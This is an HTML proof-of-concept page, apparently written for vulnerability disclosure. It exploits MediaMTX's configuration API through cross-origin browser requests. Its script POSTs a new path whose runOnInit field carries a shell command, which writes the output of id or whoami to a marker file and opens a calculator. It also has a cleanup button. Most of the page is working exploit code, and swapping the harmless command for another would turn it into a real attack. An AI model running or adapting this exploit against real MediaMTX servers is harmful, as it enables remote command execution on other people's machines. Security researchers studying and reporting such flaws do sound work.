<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MediaMTX CORS/LNA bounded RCE proof</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      max-width: 920px;
      margin: 40px auto;
      padding: 0 16px;
      line-height: 1.5;
    }
    label { display: block; margin-top: 12px; font-weight: 600; }
    input, select {
      width: 100%;
      box-sizing: border-box;
      padding: 8px;
      margin-top: 6px;
    }
    button {
      margin: 10px 8px 10px 0;
      padding: 8px 12px;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      background: #f4f4f4;
      padding: 12px;
      border-radius: 6px;
    }
    .note {
      border-left: 4px solid #777;
      padding-left: 12px;
      margin: 16px 0;
    }
  </style>
</head>
<body>
  <h1>MediaMTX CORS/LNA bounded RCE proof</h1>

  <p class="note">
    Disposable local lab only. The test adds one temporary runtime path with
    <code>runOnInit</code>. The command writes an identity marker and then
    attempts to launch a calculator. It does not modify <code>mediamtx.yml</code>.
  </p>

  <label for="base">API base</label>
  <input id="base" value="http://localhost:19997/v3">

  <label for="os">Target OS</label>
  <select id="os">
    <option value="windows">Windows</option>
    <option value="linux">Linux</option>
  </select>

  <p><strong>Command preview:</strong></p>
  <pre id="cmd"></pre>

  <button id="run">1. Add temporary path and execute</button>
  <button id="cleanup">2. Delete temporary path</button>

  <p><strong>Result:</strong></p>
  <pre id="out"></pre>

<script>
const out = document.getElementById("out");
const baseInput = document.getElementById("base");
const osSelect = document.getElementById("os");
const cmdPreview = document.getElementById("cmd");

let pathName = null;

function detectOS() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("linux") && !ua.includes("android")) {
    osSelect.value = "linux";
  } else {
    osSelect.value = "windows";
  }
}

function commandFor(os) {
  if (os === "linux") {
    return "sh -c 'id > /tmp/mediamtx-cors-rce-linux.txt; " +
      "echo MEDIAMTX_CORS_RCE_LINUX >> /tmp/mediamtx-cors-rce-linux.txt; " +
      "if command -v gnome-calculator >/dev/null 2>&1; then exec gnome-calculator; " +
      "elif command -v kcalc >/dev/null 2>&1; then exec kcalc; " +
      "elif command -v xcalc >/dev/null 2>&1; then exec xcalc; " +
      "else sleep 15; fi'";
  }

  return 'cmd /c "whoami > %TEMP%\\mediamtx-cors-rce-windows.txt & ' +
    'echo MEDIAMTX_CORS_RCE_WINDOWS>>%TEMP%\\mediamtx-cors-rce-windows.txt & ' +
    'calc.exe"';
}

function markerFor(os) {
  if (os === "linux") {
    return "/tmp/mediamtx-cors-rce-linux.txt";
  }
  return "%TEMP%\\mediamtx-cors-rce-windows.txt";
}

function updatePreview() {
  cmdPreview.textContent = commandFor(osSelect.value);
}

function write(v) {
  out.textContent += (typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n";
}

async function req(path, options = {}) {
  const base = baseInput.value.replace(/\/+$/, "");
  const url = base + path;

  const opts = {
    mode: "cors",
    credentials: "omit",
    cache: "no-store",
    ...options,
  };

  write(`--> ${opts.method || "GET"} ${url}`);

  try {
    const r = await fetch(url, opts);
    const text = await r.text();

    let body = text;
    try { body = JSON.parse(text); } catch (_) {}

    const result = {
      ok: r.ok,
      status: r.status,
      body
    };

    write(result);
    return result;
  } catch (e) {
    const result = {
      fetchRejected: true,
      name: e.name,
      message: e.message
    };
    write(result);
    throw e;
  }
}

document.getElementById("run").onclick = async () => {
  out.textContent = "";

  const os = osSelect.value;
  const command = commandFor(os);
  const marker = markerFor(os);

  write({
    pageOrigin: location.origin,
    isSecureContext: window.isSecureContext,
    userAgent: navigator.userAgent,
    selectedTargetOS: os
  });

  pathName = `cors-rce-poc-${os}-${Date.now()}`;

  const body = {
    runOnInit: command,
    runOnInitRestart: false
  };

  try {
    const r = await req("/config/paths/add/" + encodeURIComponent(pathName), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (!r.ok) {
      throw new Error(`path add failed: HTTP ${r.status}`);
    }

    write(`PATH: ${pathName}`);
    write(`EXPECTED MARKER: ${marker}`);

    if (os === "windows") {
      write("EXPECTED VISIBLE EFFECT: Windows Calculator should open if the MediaMTX session can display GUI applications.");
      write('VERIFY: Get-Content "$env:TEMP\\mediamtx-cors-rce-windows.txt"');
    } else {
      write("EXPECTED VISIBLE EFFECT: gnome-calculator, kcalc, or xcalc is attempted if installed and a GUI session is available.");
      write("VERIFY: cat /tmp/mediamtx-cors-rce-linux.txt");
    }

    write("Check the MediaMTX console for: runOnInit command started");
    write("The marker file is the authoritative command-execution proof; GUI launch is only a visible secondary effect.");
  } catch (e) {
    write(`RESULT: failed: ${e.message}`);
  }
};

document.getElementById("cleanup").onclick = async () => {
  if (!pathName) {
    write("No runtime path was created in this page session.");
    return;
  }

  try {
    const r = await req("/config/paths/delete/" + encodeURIComponent(pathName), {
      method: "DELETE",
    });

    if (!r.ok) {
      throw new Error(`path delete failed: HTTP ${r.status}`);
    }

    write(`Deleted runtime path: ${pathName}`);
    pathName = null;
  } catch (e) {
    write(`Cleanup failed: ${e.message}`);
  }
};

osSelect.addEventListener("change", updatePreview);

detectOS();
updatePreview();
</script>
</body>
</html>
